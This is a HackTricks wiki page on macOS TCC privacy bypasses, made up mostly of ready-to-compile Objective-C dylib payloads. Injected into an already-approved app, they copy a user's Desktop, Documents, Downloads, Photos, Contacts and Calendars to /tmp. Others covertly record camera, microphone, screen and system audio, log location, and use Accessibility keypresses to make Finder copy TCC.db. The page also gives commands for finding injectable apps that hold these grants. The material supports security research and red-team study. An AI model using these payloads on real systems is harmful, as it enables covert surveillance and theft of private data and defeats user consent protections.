---
title: "macOS TCC Payloads"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-payloads.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: misc
---

## Quick triage before using a payload

Recent permission-theft research keeps reinforcing the same workflow: first find an app that already has the TCC grant you want, then verify that it is a realistic injection target.[\[1\]](#references)

```
sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
  "select service, client from access where auth_value=2 and service in ('kTCCServiceCamera','kTCCServiceMicrophone','kTCCServiceScreenCapture','kTCCServiceAccessibility') order by service, client;"
codesign -d --entitlements :- /Applications/Target.app 2>/dev/null | \
  egrep 'disable-library-validation|allow-dyld-environment-variables'
```
If the target also loads attacker-controlled plug-ins / frameworks, these payloads become much more interesting. For broader post-exploitation ideas after landing inside an already-approved process, check [this related page](macos-tcc-credential-and-data-theft.html).

### Desktop

- **Entitlement** : None
- **TCC** : kTCCServiceSystemPolicyDesktopFolder

Copy `$HOME/Desktop` to `/tmp/desktop`.

```
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>
// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m
__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;
    // Get the path to the user's Pictures folder
    NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Desktop"];
    NSString *tmpPhotosPath = @"/tmp/desktop";
    // Copy the contents recursively
    if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
        NSLog(@"Error copying items: %@", error);
    }
    NSLog(@"Copy completed successfully.", error);
    fclose(stderr); // Close the file stream
}
```
### Documents

- **Entitlement** : None
- **TCC** :`kTCCServiceSystemPolicyDocumentsFolder`

Copy `$HOME/Documents` to `/tmp/documents`.

```
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>
// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m
__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;
    // Get the path to the user's Pictures folder
    NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    NSString *tmpPhotosPath = @"/tmp/documents";
    // Copy the contents recursively
    if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
        NSLog(@"Error copying items: %@", error);
    }
    NSLog(@"Copy completed successfully.", error);
    fclose(stderr); // Close the file stream
}
```
### Downloads

- **Entitlement** : None
- **TCC** :`kTCCServiceSystemPolicyDownloadsFolder`

Copy `$HOME/Downloads` to `/tmp/downloads`.

```
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>
// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m
__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;
    // Get the path to the user's Pictures folder
    NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Downloads"];
    NSString *tmpPhotosPath = @"/tmp/downloads";
    // Copy the contents recursively
    if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
        NSLog(@"Error copying items: %@", error);
    }
    NSLog(@"Copy completed successfully.", error);
    fclose(stderr); // Close the file stream
}
```
### Photos Library

- **Entitlement** :`com.apple.security.personal-information.photos-library`
- **TCC** :`kTCCServicePhotos`

Copy `$HOME/Pictures/Photos Library.photoslibrary` to `/tmp/photos`.

```
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>
// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m
__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;
    // Get the path to the user's Pictures folder
    NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Pictures/Photos Library.photoslibrary"];
    NSString *tmpPhotosPath = @"/tmp/photos";
    // Copy the contents recursively
    if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
        NSLog(@"Error copying items: %@", error);
    }
    NSLog(@"Copy completed successfully.", error);
    fclose(stderr); // Close the file stream
}
```
### Contacts

- **Entitlement** :`com.apple.security.personal-information.addressbook`
- **TCC** :`kTCCServiceAddressBook`

Copy `$HOME/Library/Application Support/AddressBook` to `/tmp/contacts`.

```
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>
// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m
__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;
    // Get the path to the user's Pictures folder
    NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Application Support/AddressBook"];
    NSString *tmpPhotosPath = @"/tmp/contacts";
    // Copy the contents recursively
    if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
        NSLog(@"Error copying items: %@", error);
    }
    NSLog(@"Copy completed successfully.", error);
    fclose(stderr); // Close the file stream
}
```
### Calendar

- **Entitlement** :`com.apple.security.personal-information.calendars`
- **TCC** :`kTCCServiceCalendar`

Copy `$HOME/Library/Calendars` to `/tmp/calendars`.

```
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>
// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m
__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;
    // Get the path to the user's Pictures folder
    NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Calendars/"];
    NSString *tmpPhotosPath = @"/tmp/calendars";
    // Copy the contents recursively
    if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
        NSLog(@"Error copying items: %@", error);
    }
    NSLog(@"Copy completed successfully.", error);
    fclose(stderr); // Close the file stream
}
```
### Camera

- **Entitlement** :`com.apple.security.device.camera`
- **TCC** :`kTCCServiceCamera`

Record a 3s video and save it in `/tmp/recording.mov`[\[5\]](#references)

```
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>
// gcc -framework Foundation -framework AVFoundation -dynamiclib CamTest.m -o CamTest.dylib
// Code from: https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4
@interface VideoRecorder : NSObject <AVCaptureFileOutputRecordingDelegate>
@property (strong, nonatomic) AVCaptureSession *captureSession;
@property (strong, nonatomic) AVCaptureDeviceInput *videoDeviceInput;
@property (strong, nonatomic) AVCaptureMovieFileOutput *movieFileOutput;
- (void)startRecording;
- (void)stopRecording;
@end
@implementation VideoRecorder
- (instancetype)init {
    self = [super init];
    if (self) {
        [self setupCaptureSession];
    }
    return self;
}
- (void)setupCaptureSession {
    self.captureSession = [[AVCaptureSession alloc] init];
    self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;
    AVCaptureDevice *videoDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
    NSError *error;
    self.videoDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:videoDevice error:&error];
    if (error) {
        NSLog(@"Error setting up video device input: %@", [error localizedDescription]);
        return;
    }
    if ([self.captureSession canAddInput:self.videoDeviceInput]) {
        [self.captureSession addInput:self.videoDeviceInput];
    }
    self.movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];
    if ([self.captureSession canAddOutput:self.movieFileOutput]) {
        [self.captureSession addOutput:self.movieFileOutput];
    }
}
- (void)startRecording {
    [self.captureSession startRunning];
    NSString *outputFilePath = @"/tmp/recording.mov";
    NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
    [self.movieFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
    NSLog(@"Recording started");
}
- (void)stopRecording {
    [self.movieFileOutput stopRecording];
    [self.captureSession stopRunning];
    NSLog(@"Recording stopped");
}
#pragma mark - AVCaptureFileOutputRecordingDelegate
- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
      fromConnections:(NSArray<AVCaptureConnection *> *)connections
                error:(NSError *)error {
    if (error) {
        NSLog(@"Recording failed: %@", [error localizedDescription]);
    } else {
        NSLog(@"Recording finished successfully. Saved to %@", outputFileURL.path);
    }
}
@end
__attribute__((constructor))
static void myconstructor(int argc, const char **argv) {
    freopen("/tmp/logs.txt", "a", stderr);
    VideoRecorder *videoRecorder = [[VideoRecorder alloc] init];
    [videoRecorder startRecording];
    [NSThread sleepForTimeInterval:3.0];
    [videoRecorder stopRecording];
    [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:3.0]];
    fclose(stderr); // Close the file stream
}
```
### Microphone

- **Entitlement** :**com.apple.security.device.audio-input**
- **TCC** :`kTCCServiceMicrophone`

Record 5s of audio and store it in `/tmp/recording.m4a`[\[6\]](#references)

```
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>
// Code from https://www.vicarius.io/vsociety/posts/cve-2023-26818-exploit-macos-tcc-bypass-w-telegram-part-1-2
// gcc -dynamiclib -framework Foundation -framework AVFoundation Micexploit.m -o Micexploit.dylib
@interface AudioRecorder : NSObject <AVCaptureFileOutputRecordingDelegate>
@property (strong, nonatomic) AVCaptureSession *captureSession;
@property (strong, nonatomic) AVCaptureDeviceInput *audioDeviceInput;
@property (strong, nonatomic) AVCaptureMovieFileOutput *audioFileOutput;
- (void)startRecording;
- (void)stopRecording;
@end
@implementation AudioRecorder
- (instancetype)init {
    self = [super init];
    if (self) {
        [self setupCaptureSession];
    }
    return self;
}
- (void)setupCaptureSession {
    self.captureSession = [[AVCaptureSession alloc] init];
    self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;
    AVCaptureDevice *audioDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeAudio];
    NSError *error;
    self.audioDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:audioDevice error:&error];
    if (error) {
        NSLog(@"Error setting up audio device input: %@", [error localizedDescription]);
        return;
    }
    if ([self.captureSession canAddInput:self.audioDeviceInput]) {
        [self.captureSession addInput:self.audioDeviceInput];
    }
    self.audioFileOutput = [[AVCaptureMovieFileOutput alloc] init];
    if ([self.captureSession canAddOutput:self.audioFileOutput]) {
        [self.captureSession addOutput:self.audioFileOutput];
    }
}
- (void)startRecording {
    [self.captureSession startRunning];
    NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"recording.m4a"];
    NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
    [self.audioFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
    NSLog(@"Recording started");
}
- (void)stopRecording {
    [self.audioFileOutput stopRecording];
    [self.captureSession stopRunning];
    NSLog(@"Recording stopped");
}
#pragma mark - AVCaptureFileOutputRecordingDelegate
- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
      fromConnections:(NSArray<AVCaptureConnection *> *)connections
                error:(NSError *)error {
    if (error) {
        NSLog(@"Recording failed: %@", [error localizedDescription]);
    } else {
        NSLog(@"Recording finished successfully. Saved to %@", outputFileURL.path);
    }
    NSLog(@"Saved to %@", outputFileURL.path);
}
@end
__attribute__((constructor))
static void myconstructor(int argc, const char **argv) {
    freopen("/tmp/logs.txt", "a", stderr);
    AudioRecorder *audioRecorder = [[AudioRecorder alloc] init];
    [audioRecorder startRecording];
    [NSThread sleepForTimeInterval:5.0];
    [audioRecorder stopRecording];
    [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
    fclose(stderr); // Close the file stream
}
```
### System Audio (Core Audio process taps)

- **Entitlement** : No dedicated system-audio-capture entitlement for an unsandboxed client (normal sandbox restrictions still apply)
- **Usage description** :`NSAudioCaptureUsageDescription`
- **TCC** : System Audio Recording (independent from the Microphone grant)

On **macOS 14.2+**, Core Audio process taps can copy the outgoing audio of selected processes, a group of processes, or the global mix without installing a virtual loopback driver. The low-level chain is `CATapDescription` -> `AudioHardwareCreateProcessTap` -> private aggregate device -> `AudioDeviceIOProc`; the first attempt to start recording through an aggregate containing the tap causes macOS to request System Audio Recording access. A bundle must contain `NSAudioCaptureUsageDescription` or the consent flow cannot work correctly.[\[7\]](#references)

For a fast payload, [`catap`](https://github.com/sbetko/catap) wraps the tap, aggregate-device, IO callback, WAV writer, and cleanup lifecycle:[\[8\]](#references)

```
python3 -m venv /tmp/catap-env
source /tmp/catap-env/bin/activate
pip install catap
catap list-apps
catap record Safari -d 10 -o /tmp/safari.wav
catap record --system -d 10 -o /tmp/system-mix.wav
```
Warning

TCC attributes a CLI capture to the **hosting terminal app**, not merely to the Python process. Without the System Audio Recording grant, the Core Audio graph may start and deliver correctly sized but **zero-filled buffers**, which is easy to mistake for a working capture of a quiet target. Grant the host, restart it, and repeat with a known audible source; `catap` also reports when a recording contained only silence.[\[8\]](#references)

### Location

For an app to get the location, **Location Services** (from Privacy & Security) **must be enabled,** if not it won’t be able to access it.

- **Entitlement** :`com.apple.security.personal-information.location`
- **TCC** : Granted in`/var/db/locationd/clients.plist`

Write the location in `/tmp/logs.txt`

```
#include <syslog.h>
#include <stdio.h>
#import <Foundation/Foundation.h>
#import <CoreLocation/CoreLocation.h>
@interface LocationManagerDelegate : NSObject <CLLocationManagerDelegate>
@end
@implementation LocationManagerDelegate
- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations {
    CLLocation *location = [locations lastObject];
    NSLog(@"Current location: %@", location);
    exit(0); // Exit the program after receiving the first location update
}
- (void)locationManager:(CLLocationManager *)manager didFailWithError:(NSError *)error {
    NSLog(@"Error getting location: %@", error);
    exit(1); // Exit the program on error
}
@end
__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
    NSLog(@"Getting location");
    CLLocationManager *locationManager = [[CLLocationManager alloc] init];
    LocationManagerDelegate *delegate = [[LocationManagerDelegate alloc] init];
    locationManager.delegate = delegate;
    [locationManager requestWhenInUseAuthorization]; // or use requestAlwaysAuthorization
    [locationManager startUpdatingLocation];
    NSRunLoop *runLoop = [NSRunLoop currentRunLoop];
    while (true) {
        [runLoop runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
    }
    NSLog(@"Location completed successfully.");
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
}
```
### Screen Recording

- **Entitlement** : None
- **TCC** :`kTCCServiceScreenCapture`

Record the main screen for 5s in `/tmp/screen.mov`

```
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>
// clang -framework Foundation -framework AVFoundation -framework CoreVideo -framework CoreMedia -framework CoreGraphics -o ScreenCapture ScreenCapture.m
@interface MyRecordingDelegate : NSObject <AVCaptureFileOutputRecordingDelegate>
@end
@implementation MyRecordingDelegate
- (void)captureOutput:(AVCaptureFileOutput *)output
    didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
    fromConnections:(NSArray *)connections
    error:(NSError *)error {
    if (error) {
        NSLog(@"Recording error: %@", error);
    } else {
        NSLog(@"Recording finished successfully.");
    }
    exit(0);
}
@end
__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
    AVCaptureSession *captureSession = [[AVCaptureSession alloc] init];
    AVCaptureScreenInput *screenInput = [[AVCaptureScreenInput alloc] initWithDisplayID:CGMainDisplayID()];
    if ([captureSession canAddInput:screenInput]) {
        [captureSession addInput:screenInput];
    }
    AVCaptureMovieFileOutput *fileOutput = [[AVCaptureMovieFileOutput alloc] init];
    if ([captureSession canAddOutput:fileOutput]) {
        [captureSession addOutput:fileOutput];
    }
    [captureSession startRunning];
    MyRecordingDelegate *delegate = [[MyRecordingDelegate alloc] init];
    [fileOutput startRecordingToOutputFileURL:[NSURL fileURLWithPath:@"/tmp/screen.mov"] recordingDelegate:delegate];
    // Run the loop for 5 seconds to capture
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        [fileOutput stopRecording];
    });
    CFRunLoopRun();
    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
}
```

On **macOS 12.3+**, `ScreenCaptureKit` is usually the better post-exploitation primitive than `AVCaptureScreenInput`: it can do high-performance streaming, single-frame grabs with `SCScreenshotManager`, and stream **system audio**. Recent `ScreenCaptureKit` updates also added `captureMicrophone` / `microphoneCaptureDeviceID` on `SCStreamConfiguration` plus `SCRecordingOutput` for straight-to-file recording, so one hijacked screen-capture client can save screen + system audio directly and add mic audio when the process also holds `kTCCServiceMicrophone`.<sup>[\[4\]](#references)</sup> For more desktop-session abuse primitives, see [this related page](../macos-input-monitoring-screen-capture-accessibility.html).

### Accessibility

- **Entitlement** : None
- **TCC** :`kTCCServiceAccessibility`

Use the TCC privilege to accept the control of Finder pressing enter and bypass TCC that way

```
#import <Foundation/Foundation.h>
#import <ApplicationServices/ApplicationServices.h>
#import <OSAKit/OSAKit.h>
// clang -framework Foundation -framework ApplicationServices -framework OSAKit -o ParallelScript ParallelScript.m
// TODO: Improve to monitor the foreground app and press enter when TCC appears
void SimulateKeyPress(CGKeyCode keyCode) {
    CGEventRef keyDownEvent = CGEventCreateKeyboardEvent(NULL, keyCode, true);
    CGEventRef keyUpEvent = CGEventCreateKeyboardEvent(NULL, keyCode, false);
    CGEventPost(kCGHIDEventTap, keyDownEvent);
    CGEventPost(kCGHIDEventTap, keyUpEvent);
    if (keyDownEvent) CFRelease(keyDownEvent);
    if (keyUpEvent) CFRelease(keyUpEvent);
}
void RunAppleScript() {
    NSLog(@"Starting AppleScript");
    NSString *scriptSource = @"tell application \"Finder\"\n"
                             "set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias\n"
                             "set targetFolder to POSIX file \"/tmp\" as alias\n"
                             "duplicate file sourceFile to targetFolder with replacing\n"
                             "end tell\n";
    NSDictionary *errorDict = nil;
    NSAppleScript *appleScript = [[NSAppleScript alloc] initWithSource:scriptSource];
    [appleScript executeAndReturnError:&errorDict];
    if (errorDict) {
        NSLog(@"AppleScript Error: %@", errorDict);
    }
}
int main() {
    @autoreleasepool {
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            RunAppleScript();
        });
        // Simulate pressing the Enter key every 0.1 seconds
        NSLog(@"Starting key presses");
        for (int i = 0; i < 10; ++i) {
            SimulateKeyPress((CGKeyCode)36); // Key code for Enter
            usleep(100000); // 0.1 seconds
        }
    }
    return 0;
}
```
[!CAUTION] > **Accessibility is a very powerful permission**, you could abuse it in other ways, for example you could perform the **keystrokes attack** just from it without needed to call System Events.

Newer macOS versions also split desktop-session abuse across **Input Monitoring** (`kTCCServiceListenEvent`) and **synthetic input** (`kTCCServicePostEvent`). If you need keylogging, screen grabs, or raw event injection instead of AXUIElement automation, check [macOS Input Monitoring, Screen Capture & Accessibility Abuse](../macos-input-monitoring-screen-capture-accessibility.html).

## References
